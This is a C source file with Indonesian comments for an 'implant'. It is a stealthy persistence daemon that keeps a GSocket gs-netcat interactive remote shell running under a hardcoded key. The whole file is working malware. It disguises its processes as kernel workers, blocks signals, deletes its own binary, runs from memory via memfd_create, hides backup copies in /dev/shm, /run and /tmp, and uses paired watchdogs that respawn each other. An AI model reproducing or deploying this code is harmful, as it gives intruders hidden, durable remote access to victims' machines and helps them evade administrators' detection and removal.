/*
 * implant.c — GSocket Persistent Daemon
 * Compile: gcc -o implant implant.c -O2 -s
 *
 * Update: backup gs-netcat ke lokasi tersembunyi saat pertama kali jalan
 *         sehingga kalau binary utama di-uninstall, masih bisa spawn dari backup
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <errno.h>

// ─── CONFIG ───────────────────────────────────────────────────────────────────
#define GSOCKET_KEY     "GCpb4EGj3VxXdzHyk665a7"
#define GSOCKET_BIN     "gs-netcat"
#define FAKE_PROC_NAME  "[kworker/2:1H]"
#define WATCHDOG_INTERVAL 3
#define SELF_DELETE     1
// ─────────────────────────────────────────────────────────────────────────────

// Semua path yang dicoba untuk cari gs-netcat binary
// Termasuk backup path di lokasi tersembunyi
static const char *gs_paths[] = {
    "/usr/bin/gs-netcat",
    "/usr/local/bin/gs-netcat",
    "/dev/shm/.gs-n",
    "/run/.gs-n",
    "/tmp/.gs-n",
    "/var/tmp/.gs-n",
    "/dev/shm/.kgs",
    NULL
};

// Lokasi backup binary gs-netcat
static const char *backup_paths[] = {
    "/dev/shm/.gs-n",
    "/run/.gs-n",
    "/tmp/.gs-n",
    "/var/tmp/.gs-n",
    NULL
};

// Lokasi backup binary implant itu sendiri
static const char *implant_backup_paths[] = {
    "/dev/shm/.kworker",
    "/run/.systemd-private",
    "/tmp/.dbus-session",
    NULL
};

static pid_t child_pid = 0;
static char  self_path[512];

// ─── HELPERS ─────────────────────────────────────────────────────────────────

static void mask_signals(void) {
    sigset_t mask;
    sigfillset(&mask);
    sigdelset(&mask, SIGKILL);
    sigdelset(&mask, SIGSTOP);
    sigdelset(&mask, SIGCHLD);
    sigprocmask(SIG_BLOCK, &mask, NULL);
}

static void disguise(const char *name) {
    prctl(PR_SET_NAME, name, 0, 0, 0);
}

static void self_delete(void) {
    if (strlen(self_path) > 0)
        unlink(self_path);
}

// Copy file dari src ke dst
static int copy_file(const char *src, const char *dst) {
    int fd_in, fd_out;
    char buf[4096];
    ssize_t n;

    fd_in = open(src, O_RDONLY);
    if (fd_in < 0) return -1;

    fd_out = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fd_out < 0) { close(fd_in); return -1; }

    while ((n = read(fd_in, buf, sizeof(buf))) > 0) {
        ssize_t w = write(fd_out, buf, (size_t)n);
        (void)w;
    }

    close(fd_in);
    close(fd_out);
    return 0;
}

// Backup gs-netcat binary ke semua lokasi tersembunyi
static void backup_gsocket_binary(void) {
    const char *src = NULL;
    int i;

    // Cari binary yang ada
    for (i = 0; gs_paths[i]; i++) {
        if (access(gs_paths[i], X_OK) == 0) {
            src = gs_paths[i];
            break;
        }
    }

    if (!src) return;

    // Copy ke semua backup path
    for (i = 0; backup_paths[i]; i++) {
        if (access(backup_paths[i], X_OK) != 0) {
            copy_file(src, backup_paths[i]);
            chmod(backup_paths[i], 0755);
        }
    }
}

// Jalankan binary dari memory via memfd_create
static int memfd_exec(const char *bin_path, char *const argv[], char *const envp[]) {
    int fd_in;
    struct stat st;
    void *buf;
    int mfd;
    char fd_path[64];

    fd_in = open(bin_path, O_RDONLY);
    if (fd_in < 0) return -1;

    if (fstat(fd_in, &st) < 0) { close(fd_in); return -1; }

    buf = malloc((size_t)st.st_size);
    if (!buf) { close(fd_in); return -1; }

    if (read(fd_in, buf, (size_t)st.st_size) != st.st_size) {
        close(fd_in); free(buf); return -1;
    }
    close(fd_in);

    mfd = (int)syscall(SYS_memfd_create, "kthread", 1U);
    if (mfd < 0) { free(buf); return -1; }

    ssize_t w = write(mfd, buf, (size_t)st.st_size);
    (void)w;
    free(buf);

    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", mfd);
    execve(fd_path, argv, envp);

    close(mfd);
    return -1;
}

// Spawn gsocket — coba semua path yang tersedia
static pid_t spawn_gsocket(void) {
    pid_t pid = fork();
    if (pid != 0) return pid;

    // Child process
    disguise("[kworker/0:0H]");
    mask_signals();
    setsid();

    int devnull = open("/dev/null", O_RDWR);
    if (devnull >= 0) {
        dup2(devnull, 0);
        dup2(devnull, 1);
        dup2(devnull, 2);
        close(devnull);
    }

    char *gs_argv[] = {
        (char *)GSOCKET_BIN,
        (char *)"-s", (char *)GSOCKET_KEY,
        (char *)"-l",
        (char *)"-i",
        (char *)"-q",
        NULL
    };

    char *gs_envp[] = {
        (char *)"HOME=/root",
        (char *)"PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin",
        (char *)"TERM=xterm-256color",
        NULL
    };

    // Coba semua path — termasuk backup
    int i;
    for (i = 0; gs_paths[i]; i++) {
        if (access(gs_paths[i], X_OK) == 0) {
            // Coba via memfd dulu (tidak ada file di disk saat jalan)
            memfd_exec(gs_paths[i], gs_argv, gs_envp);
            // Fallback ke exec langsung
            execv(gs_paths[i], gs_argv);
        }
    }

    exit(1);
}

// Backup binary implant ke lokasi tersembunyi
static void install_copies(void) {
    const char *src = "/proc/self/exe";
    char cmd[256];
    int i;

    for (i = 0; implant_backup_paths[i]; i++) {
        snprintf(cmd, sizeof(cmd),
            "cp %s %s 2>/dev/null && chmod 755 %s",
            src, implant_backup_paths[i], implant_backup_paths[i]);
        int r = system(cmd);
        (void)r;
    }
}

// Double fork untuk jadi orphan daemon
static void daemonize(void) {
    pid_t pid;

    pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);

    setsid();

    pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);

    umask(0);
    int r = chdir("/");
    (void)r;
}

// Watchdog utama — restart gsocket jika mati
static void watchdog_loop(void) {
    disguise("[kworker/1:1H]");
    mask_signals();
    setsid();

    while (1) {
        // Cek dan restore backup gs-netcat jika perlu
        backup_gsocket_binary();

        if (child_pid > 0) {
            int status;
            pid_t res = waitpid(child_pid, &status, WNOHANG);
            if (res == child_pid || res == -1)
                child_pid = spawn_gsocket();
        } else {
            child_pid = spawn_gsocket();
        }
        sleep(WATCHDOG_INTERVAL);
    }
}

// Watchdog chain — dua proses saling jaga
static void start_watchdog_chain(void) {
    pid_t watch_pid = fork();

    if (watch_pid == 0) {
        // Watchdog kedua
        disguise("[kworker/1:1H]");
        mask_signals();

        pid_t parent = getppid();
        while (1) {
            sleep(WATCHDOG_INTERVAL);

            // Jika parent mati, restart implant dari backup
            if (kill(parent, 0) < 0 && errno == ESRCH) {
                char *re_argv[] = {
                    (char *)FAKE_PROC_NAME,
                    (char *)"--daemon",
                    NULL
                };
                // Coba exec dari /proc/self/exe dulu
                execv("/proc/self/exe", re_argv);

                // Jika tidak ada, coba dari backup lokasi
                int i;
                for (i = 0; implant_backup_paths[i]; i++) {
                    if (access(implant_backup_paths[i], X_OK) == 0)
                        execv(implant_backup_paths[i], re_argv);
                }
                exit(0);
            }

            // Cek gsocket masih hidup
            if (child_pid > 0) {
                if (kill(child_pid, 0) < 0 && errno == ESRCH) {
                    backup_gsocket_binary();
                    child_pid = spawn_gsocket();
                }
            }
        }
        exit(0);
    }

    // Watchdog pertama jalan di sini
    watchdog_loop();
}

// ─── MAIN ─────────────────────────────────────────────────────────────────────

int main(int argc, char *argv[]) {
    ssize_t len;

    // Simpan path binary ini sebelum self-delete
    len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (len > 0) self_path[len] = '\0';

    // Ganti nama proses di ps
    if (argc > 0 && argv[0]) {
        size_t arglen    = strlen(argv[0]);
        size_t fakelen   = strlen(FAKE_PROC_NAME);
        size_t copylen   = arglen < fakelen ? arglen : fakelen;
        memset(argv[0], 0, arglen);
        strncpy(argv[0], FAKE_PROC_NAME, copylen);
    }
    disguise(FAKE_PROC_NAME);

    // Backup gs-netcat binary dulu sebelum daemonize
    backup_gsocket_binary();

    // Install kopian implant ke lokasi tersembunyi
    install_copies();

    // Jadikan daemon (double fork)
    daemonize();

    // Self-delete binary asli
    if (SELF_DELETE)
        self_delete();

    // Block sinyal
    mask_signals();

    // Spawn gsocket pertama kali
    child_pid = spawn_gsocket();

    // Start watchdog chain
    start_watchdog_chain();

    return 0;
}
